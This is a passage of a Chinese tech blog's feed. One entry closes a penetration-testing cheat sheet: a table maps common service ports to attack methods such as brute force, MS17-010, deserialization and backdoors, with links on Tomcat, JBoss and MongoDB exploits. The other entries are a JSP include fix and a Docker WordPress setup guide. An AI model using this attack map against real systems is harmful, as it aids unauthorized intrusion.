rel="noopener">服务器</a>，对于这种大型<a href="https://www.nkymbk.cn/tag/服务器" target="_blank" rel="noopener">服务器</a>的<a href="https://www.nkymbk.cn/tag/渗透" target="_blank" rel="noopener">渗透</a>，主要有以下<a href="https://www.nkymbk.cn/tag/方法" target="_blank" rel="noopener">方法</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）Tomcat远程代码执行漏洞（https:``//www.freebuf.com/column/159200.html）``（2）Tomcat任意文件上传。（http:``//liehu.tass.com.cn/archives/836）``（3）Tomcat远程代码执行&amp;信息泄露。（https:``//paper.seebug.org/399/）``（4）Jboss远程代码执行。（http:``//mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）``（5）Jboss反序列化漏洞。（https:``//www.zybuluo.com/websec007/note/838374）``（6）Jboss漏洞利用。（https:``//blog.csdn.net/u011215939/article/details/79141624）`</span><br></pre></td></tr></table></figure><p><strong>27017端口渗透剖析</strong></p><p>MongoDB，No<a href="https://www.nkymbk.cn/tag/SQL" target="_blank" rel="noopener">SQL</a><a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>；<a href="https://www.nkymbk.cn/tag/攻击" target="_blank" rel="noopener">攻击</a><a href="https://www.nkymbk.cn/tag/方法" target="_blank" rel="noopener">方法</a>与其他<a href="https://www.nkymbk.cn/tag/数据库" target="_blank" rel="noopener">数据库</a>类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`（1）爆破：弱口令``（2）未授权访问；（http:``//www.cnblogs.com/LittleHann/p/6252421.html）（3）http://www.tiejiang.org/19157.htm`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/端口&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;端口&lt;/a&gt;&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;服务&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/入侵&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;入侵&lt;/a&gt;方式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;21&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;ftp/tftp/vsftpd文件传输协议&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/嗅探/溢出/&lt;a href=&quot;https://www.nkymbk.cn/tag/后门&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;后门&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;22&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;ssh远程连接&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/openssh&lt;a href=&quot;https://www.nkymbk.cn/tag/漏洞&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;漏洞&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;23&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Telnet远程连接&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/嗅探/弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;25&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;SMTP邮件服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;邮件伪造&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;53&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;DNS&lt;a href=&quot;https://www.nkymbk.cn/tag/域名&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;域名&lt;/a&gt;解析&lt;a href=&quot;https://www.nkymbk.cn/tag/系统&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;系统&lt;/a&gt;&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;域传送/&lt;a href=&quot;https://www.nkymbk.cn/tag/劫持&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;劫持&lt;/a&gt;/缓存投毒/欺骗&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;67/68&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;dhcp服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/劫持&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;劫持&lt;/a&gt;/欺骗&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;110&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;pop3&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/嗅探&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;139&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Samba服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/未授权访问/远程&lt;a href=&quot;https://www.nkymbk.cn/tag/命令执行&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;命令执行&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;143&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Imap协议&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;161&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;SNMP协议&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/搜集目标内网信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;389&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Ldap目录访问协议&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/注入&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;注入&lt;/a&gt;/未授权访问/弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/445&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;445&lt;/a&gt;&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;smb&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;ms17-010/&lt;a href=&quot;https://www.nkymbk.cn/tag/端口&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;端口&lt;/a&gt;溢出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;512/513/514&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/Linux&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux&lt;/a&gt; Rexec服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/Rlogin登陆&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;873&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Rsync服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;文件上传/未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;1080&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;socket&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/135&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;135&lt;/a&gt;2&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Lotus domino邮件服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/信息泄漏&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;1433&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;mssql&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/&lt;a href=&quot;https://www.nkymbk.cn/tag/注入&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;注入&lt;/a&gt;/SA弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;1521&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;oracle&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/&lt;a href=&quot;https://www.nkymbk.cn/tag/注入&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;注入&lt;/a&gt;/TNS&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/反弹shell&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2049&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Nfs服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/配置&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;配置&lt;/a&gt;不当&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2181&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;zookeeper服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2375&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;docker remote api&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;3306&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;mysql&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/&lt;a href=&quot;https://www.nkymbk.cn/tag/注入&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;注入&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;3389&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Rdp远程桌面链接&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/shift&lt;a href=&quot;https://www.nkymbk.cn/tag/后门&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;后门&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;4848&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;GlassFish控制台&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/认证绕过&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;5000&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;sybase/DB2&lt;a href=&quot;https://www.nkymbk.cn/tag/数据库&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;数据库&lt;/a&gt;&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/&lt;a href=&quot;https://www.nkymbk.cn/tag/注入&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;注入&lt;/a&gt;/&lt;a href=&quot;https://www.nkymbk.cn/tag/提权&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;提权&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;5432&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;postgresql&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/&lt;a href=&quot;https://www.nkymbk.cn/tag/注入&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;注入&lt;/a&gt;/缓冲区溢出&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;5632&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;pcanywhere服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;抓&lt;a href=&quot;https://www.nkymbk.cn/tag/密码&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;密码&lt;/a&gt;/&lt;a href=&quot;https://www.nkymbk.cn/tag/代码执行&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;代码执行&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;5900&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;vnc&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/认证绕过&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;6379&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Redis&lt;a href=&quot;https://www.nkymbk.cn/tag/数据库&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;数据库&lt;/a&gt;&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;未授权访问/&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;7001/7002&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;weblogic&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;java&lt;a href=&quot;https://www.nkymbk.cn/tag/反序列化&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;反序列化&lt;/a&gt;/控制台弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;80/443&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;http/https&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;web应用&lt;a href=&quot;https://www.nkymbk.cn/tag/漏洞&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;漏洞&lt;/a&gt;/心脏滴血&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;8069&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;zabbix服务&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;远程&lt;a href=&quot;https://www.nkymbk.cn/tag/命令执行&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;命令执行&lt;/a&gt;/&lt;a href=&quot;https://www.nkymbk.cn/tag/注入&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;注入&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;8161&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;activemq&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;弱口令/写文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;8080/8089&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Jboss/&lt;a href=&quot;https://www.nkymbk.cn/tag/Tomcat&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Tomcat&lt;/a&gt;/Resin&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/PUT文件上传/&lt;a href=&quot;https://www.nkymbk.cn/tag/反序列化&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;反序列化&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;8083/8086&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;influxDB&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;9000&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;fastcgi&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;远程&lt;a href=&quot;https://www.nkymbk.cn/tag/命令执行&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;命令执行&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;9090&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;Websphere控制台&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;/java&lt;a href=&quot;https://www.nkymbk.cn/tag/反序列化&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;反序列化&lt;/a&gt;/弱口令&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;9200/9300&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;elasticsearch&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;远程&lt;a href=&quot;https://www.nkymbk.cn/tag/代码执行&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;代码执行&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;11211&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;memcached&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;未授权访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;27017/27018&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;mongodb&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;未授权访问/&lt;a href=&quot;https://www.nkymbk.cn/tag/爆破&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;爆破&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
    
    </summary>
    
      <category term="网络安全" scheme="https://www.5658.pw/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="端口" scheme="https://www.5658.pw/tags/%E7%AB%AF%E5%8F%A3/"/>
    
      <category term="扫描" scheme="https://www.5658.pw/tags/%E6%89%AB%E6%8F%8F/"/>
    
      <category term="网络安全" scheme="https://www.5658.pw/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Jsp填坑</title>
    <link href="https://www.5658.pw/2019/01/03/Jsp%E5%A1%AB%E5%9D%91/"/>
    <id>https://www.5658.pw/2019/01/03/Jsp填坑/</id>
    <published>2019-01-03T07:16:43.000Z</published>
    <updated>2019-01-03T07:35:32.781Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​    今天改一个JSP项目，由于博主用的是MyEclipse最新的2018.8.0的，项目是老版本的(不知猴年马月的老东西了)导入项目后启动发现报错,错误信息为: </p><blockquote><p>File [&#47;WEB-INF&#47;jsp&#47;user&#47;rollpage.jsp] not found</p></blockquote><p>文件没有找到？？？<br><img src="http://yun.name168.cn/0039A5B0.jpg" alt="&quot;什么鬼&quot;"></p><a id="more"></a><p><strong>看到#47让我想到了SQL注入尾部的#  难道是把斜杠/给我转化为了字符</strong></p><p><img src="http://yun.name168.cn/error_jsp_500.png" alt="0039123A"></p><p>那换为绝对路径试试</p><blockquote><p>${pageContext.request.contextPath }</p></blockquote><p>绝对路径还是这个错  什么鬼 ？去问问百度大哥</p><p><img src="http://yun.name168.cn/360%E6%88%AA%E5%9B%BE165712237671109.png" alt="&quot;呆子欧阳&quot;"></p><p>百度一下   竟然无果,360就不用说了(我要你们有何用)</p><p><img src="http://yun.name168.cn/003E75DE.jpg" alt="img"></p><p>回过头来再看下代码报错位置</p><blockquote><p>&lt;%@include file=”/WEB-INF/jsp/common/head.jsp”%&gt;</p></blockquote><p><strong>突然想到了JSP的静态包含与动态包含</strong></p><p>在jsp中include有两种形式，其中&lt;%@include file=”url”%&gt;是指令元素，&lt;jsp:include page=”” flush=”true”/&gt;是动作元素。<br>&lt;%@include file=”url”%&gt;包含一个静态文件，而&lt;jsp:include page=”” flush=”true”/&gt;包含一个静态或动态文件。<br>&lt;%@include file=”url”%&gt;不会检查文件的变化，适合包含一个静态文件，被包含的文件可以是html,jsp，文本文档，如果是html，文本文档，文件内容将会添加到jsp文件中&lt;%@include file=”url”%&gt;的位置上；如果包含一个jsp文件，这个jsp文件将会被执行，将结果添加到&lt;%@include file=”url”%&gt;的位置，但其变量无法使用。</p><p>&lt;jsp:include page=”” flush=”true”/&gt;总会检查文件中所发生的变化，适合包含动态页面，所以既可以用它包含静态文件，也可以用它包含动态文件，当包含动态文件时，flush的值必须为true，表示页面可以刷新。如果被包含的是jsp页面，还可以向被包含页传递参数，例如<br>&lt;jsp:include page=”test.jsp” flush=”true”&gt;<br>&lt;jsp:param name=”index” value=”TT”/&gt;<br>&lt;jsp:param name=”home” value=”EE”/&gt;<br>&lt;/jsp:include&gt;<br>test.jsp为被包含页面。</p><p>&lt;%@include file=”url”%&gt;是先包含再编译，只会产生一个class文件，；&lt;jsp:include page=”” flush=”true”/&gt;是先编译再包含，会产生多个class文件。</p><p>值得注意的是，不管被包含的是动态文件还是静态文件，被包含的文件都不应该出现<html><body>标签，这样会影响原jsp文件中的对应标记，有时还会出错。</body></html></p><p>最后来看下正确的Demo</p><p><img src="http://yun.name168.cn/360%E6%88%AA%E5%9B%BE16720328201936.png" alt="&quot;demo&quot;"></p><p>运行无错    啊  舒服</p><p><img src="http://yun.name168.cn/0039123A.jpg" alt="&quot;欧阳网络&quot;"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    今天改一个JSP项目，由于博主用的是MyEclipse最新的2018.8.0的，项目是老版本的(不知猴年马月的老东西了)导入项目后启动发现报错,错误信息为: &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;File [&amp;#47;WEB-INF&amp;#47;jsp&amp;#47;user&amp;#47;rollpage.jsp] not found&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;文件没有找到？？？&lt;br&gt;&lt;img src=&quot;http://yun.name168.cn/0039A5B0.jpg&quot; alt=&quot;&amp;quot;什么鬼&amp;quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Java" scheme="https://www.5658.pw/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.5658.pw/tags/Java/"/>
    
      <category term="Jsp" scheme="https://www.5658.pw/tags/Jsp/"/>
    
  </entry>
  
  <entry>
    <title>Docker搭建LNMP网站平台</title>
    <link href="https://www.5658.pw/2018/12/27/Docker%E6%90%AD%E5%BB%BALNMP%E7%BD%91%E7%AB%99%E5%B9%B3%E5%8F%B0/"/>
    <id>https://www.5658.pw/2018/12/27/Docker搭建LNMP网站平台/</id>
    <published>2018-12-27T10:59:57.000Z</published>
    <updated>2018-12-27T13:00:55.979Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​    最近学Docker又入迷了:see_no_evil:那么来记录下wordpress搭建过程吧</p><p><img src="http://yun.name168.cn/Docker.jpg" alt="&quot;Docker部署&quot;"></p><a id="more"></a><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p><strong>① 主机配置：VPS 3H 4G 5M  SSD 100G</strong></p><p><strong>② 系统：CentOS  7.6.1810</strong></p><p><strong>③ 内核：4.19.10-1.el7.elrepo.x86_64</strong></p><p><strong>④数据库开发工具：DataGrip</strong></p><h4 id="创建mysql数据库容器"><a href="#创建mysql数据库容器" class="headerlink" title="创建mysql数据库容器"></a>创建mysql数据库容器</h4><blockquote><p>docker run -itd –name lnmp_mysql -p 3308:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql –character-set-server=utf8 </p></blockquote><h4 id="创建wp数据库"><a href="#创建wp数据库" class="headerlink" title="创建wp数据库"></a>创建wp数据库</h4><blockquote><p>docker exec lnmp_mysql sh -c ‘exec mysql -uroot -p”$MYSQL_ROOT_PASSWORD” -e”create database wp”‘ </p></blockquote><h4 id="创建PHP环境容器"><a href="#创建PHP环境容器" class="headerlink" title="创建PHP环境容器"></a>创建PHP环境容器</h4><blockquote><p>docker run -itd –name lnmp_web –link lnmp_mysql:db -p 88:80 -v /container_data/web:/var/www/html richarvey/nginx-php-fpm</p></blockquote><h4 id="以wordpress博客为例测试"><a href="#以wordpress博客为例测试" class="headerlink" title="以wordpress博客为例测试"></a>以wordpress博客为例测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://cn.wordpress.org/wordpress-5.0.2-zh_CN.tar.gz </span><br><span class="line">tar zxvf wordpress-5.0.2-zh_CN.tar.gz</span><br><span class="line">mv wordpress/* /container_data/web/</span><br></pre></td></tr></table></figure><h4 id="浏览器测试访问-http-localhost-88"><a 